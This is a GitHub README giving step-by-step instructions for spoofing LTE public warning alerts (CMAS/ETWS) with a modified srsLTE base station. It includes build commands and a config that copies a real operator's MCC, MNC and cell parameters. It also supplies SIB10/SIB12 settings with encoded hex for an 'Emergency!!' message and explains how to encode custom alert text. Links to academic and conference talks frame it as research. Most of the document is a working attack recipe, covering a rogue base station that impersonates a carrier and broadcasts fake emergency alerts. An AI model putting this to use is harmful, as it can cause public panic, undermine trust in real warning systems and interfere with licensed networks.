# srsLTE_CMAS_ETWS_Hacking
## PROTOCOL FLOW
<p align="center">
  <img src="https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/cmas_attack.jpg">
</p>

## Conferences 
* MobiSys 2019 - This is Your President Speaking: Spoofing Alerts in 4G LTE Networks [videos](https://www.youtube.com/watch?v=zTgibfM2_0Y) [pdf](https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/10150578%26ved%3D2ahUKEwi05aKpman7AhVkMewKHTi8CGkQFnoECAoQAQ%26usg%3DAOvVaw1tA_XqBAni4kX1EDsdeHrt.pdf)
* HITBHaxpo D1 - Hacking LTE Public Warning Systems - Weiguang Li [videos](https://www.youtube.com/watch?v=Kagw47aCwfY&t=11s) [pdf](https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/HAXPO%20D1%20-%20Hacking%20LTE%20Public%20Warning%20Systems%20-%20Weiguang%20Li%20(3).pdf)
* Warning Magnitude 10 Earthquake Is Coming in One Minute - Weiguang Li - DEF CON China 1 [videos](https://www.youtube.com/watch?v=mYe5_SAO4hE) [pdf](https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/DEF%20CON%20China%201.0%20-%20Weiguang-Li-WARNING-Magnitude-10-Earthquake-Is-Coming-in-One-Minute.pdf)
* [demos](https://www.youtube.com/watch?v=pkNHX31TZdY&pp=ygVSTW9iaVN5cyAyMDE5IC0gVGhpcyBpcyBZb3VyIFByZXNpZGVudCBTcGVha2luZ18gU3Bvb2ZpbmcgQWxlcnRzIGluIDRHIExURSBOZXR3b3Jrcw%3D%3D)

## INSTALLATION :
Apt install inspired at : https://docs.srsran.com/projects/4g/en/next/app_notes/source/pi4/source/index.html  
  
  
SHOULD CONFIGURE NODEB AS EEAO AND EEIA AND ADDING SIB12 ON SIB1 MAPPING
  
```  
sudo apt-get install build-essential cmake libfftw3-dev libmbedtls-dev libboost-program-options-dev libconfig++-dev libsctp-dev  
```
```
apt-get install git  
```
```
sudo apt-get install libuhd-dev libuhd3.15.0 uhd-host  
```
```
/usr/lib/uhd/utils/uhd_images_downloader.py  
```
```
git clone https://github.com/learning-lte/srsLTE_cmas_etws  
```
```
cd srsLTE_cmas_etws  
```
```
mkdir build  
```
```
cd build  
```
```
cmake ..  
```
```
make -j4  
```
```
make install  
```
```
ldconfig  
```
```
srslte_install_configs.sh service
```

## CONFIG : 
AT /etc/srslte/enb.conf  
You need to configure enb_id, MCC, MNC and n_prb as same as operator 

```
[enb]   

enb_id = 0x19B  

mcc = 001  

mnc = 01  

n_prb = 50  
```  
  
  
NOTED : SRSRAN SUPPORT NOW MULTICELL SO TAC AND PCI IS NOT AT /etc/srslte/enb.conf  
AT /etc/srslte/rr.conf  
You need to configure tac and pci :  

    // Cells available for handover  
    
    meas_cell_list =  
    
    (  
    
      {  
      
        eci = 0x19C02;  
        
        dl_earfcn = 2850;  
        
        pci = 2;  
                
        //direct_forward_path_available = false;  
        
        //allowed_meas_bw = 6;  
        
        //cell_individual_offset = 0;  
        
      }  
      
    );  
    



## IMPORTANT CONFIG :  
replace config at /etc/srslte/sib.conf as :  
https://github.com/learning-lte/srsLTE_cmas_etws/commit/88775bb3bd133344a1b6f2248510a68b0ea9f547  

```
sib10 =  
{  
    message_identifier = 0x1104;  
    serial_number = 0x3000;  
    warning_type = "0x580";  
}   


sib12 =  
{  
    message_identifier = 0x1112;  
    serial_number = 0x3000;  
    data_coding_scheme = 01;  
    warning_msg_segment_type = "lastSegment";  
    warning_msg_segment_num = 0;  
    warning_msg_segment_r9 = "01C576597E2EBBC7F950A8D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D1000A";   
 };  
 ```
 
## GENERATING THIS PDU : 01C576597E2EBBC7F950A8D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D1000A
* Follow this tutorial : https://www.sharetechnote.com/html/Handbook_LTE_CMAS.html
* Tools for generating PDU : http://smstools3.kekekasvi.com/topic.php?id=288
* PYTHON CODE : https://stackoverflow.com/questions/2452861/python-library-for-converting-plain-text-ascii-into-gsm-7-bit-character-set
## NB :  
* Length max of message is 93 because one page could contain 82octet. In 7bit 82octet is equivalent of 82*8/7 = 93 alphabets  
* First octet of page is the number of page : 01
* 2-th until 83-th octet after is the message : C576597E2EBBC7F950A8D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D100
* 84-th octet is the length of message : 0A or 11 alphabets
* so message 11alphabet is equivalent of 11*7/8 octet = 10octet or 20hexer: C576597E2EBBC7F950A8 equivalent of : "Emergency!!"

## COMPARING PDU AND FILE CONFIG OF SRSLTE
<img src="https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/HexWarningMsg1.jpg" width="1500px" align="center">
<b><p align="center"> VS </p></b>
<img src="https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/HexwarningMsg.jpg" width="1500px" align="center">


## IMPORTANT CODE
* Read all config at [wei_lang](https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/DEF%20CON%20China%201.0%20-%20Weiguang-Li-WARNING-Magnitude-10-Earthquake-Is-Coming-in-One-Minute.pdf)
* code of parsing and sending ASN of SIB12  of taiwan lab [header](https://github.com/SitrakaResearchAndPOC/fork_srsLTE-pws_taiwan/blob/main/srsenb/src/enb_cfg_parser.h) [source](https://github.com/SitrakaResearchAndPOC/fork_srsLTE-pws_taiwan/blob/main/srsenb/src/enb_cfg_parser.cc) [demo1](https://www.youtube.com/watch?v=EP1PnzMUaCg) [demo2](https://www.youtube.com/watch?v=lanFuySMw0g)
* sib config of taiwan lab is at [sib_config](https://github.com/SitrakaResearchAndPOC/fork_srsLTE-pws_taiwan/blob/main/srsenb/sib.conf.etws.example)
* taiwan lab for sib12 is coded at "/home/labuser/Desktop/API/bytes_code" and sib11 is directly coded
* code of parsing and sending ASN of SIB12  of lte-learning risteel [diff](https://github.com/SitrakaResearchAndPOC/fork_srsLTE_cmas_etws/commit/88775bb3bd133344a1b6f2248510a68b0ea9f547)
* sib config of lte-learning risteel is at [sib_config](https://github.com/SitrakaResearchAndPOC/fork_srsLTE_cmas_etws/blob/master/srsenb/sib.conf.example) or [sib_config2](https://github.com/SitrakaResearchAndPOC/fork_srsLTE_cmas_etws/blob/master/srsenb/sib.conf.mbsfn.example) with warning_msg_segment_r9
* lte-learning risteel version (main branch) have enodeb and ue version (fake_detected_version2 branch)
* old version inferior of [srslte_18_09](https://github.com/srsran/srsRAN_4G/releases/tag/release_18_09) and [srslte_18_09_tree](https://github.com/srsran/srsRAN_4G/tree/release_18_09) doesn't need parser, just add directly the code like liblte_rrc_pack_sys_info_block_type_7_ie at [sib12_rrc](https://github.com/srsran/srsRAN_4G/blob/release_18_09/lib/src/asn1/liblte_rrc.cc) like on [wei_lang](https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/DEF%20CON%20China%201.0%20-%20Weiguang-Li-WARNING-Magnitude-10-Earthquake-Is-Coming-in-One-Minute.pdf)

## DOCUMENTATIONS
* https://www.youtube.com/watch?v=EP1PnzMUaCg
* https://hackmd.io/@AIS3-official/Critical-Infra-day5#spoofing-wireless-emergency-alerts-attack
* https://www.leg.ba/public-warning-systems-in-mobile-networks/
* https://conference.hitb.org/hitbsecconf2019ams/materials/HAXPO%20D1%20-%20Hacking%20LTE%20Public%20Warning%20Systems%20-%20Weiguang%20Li.pdf

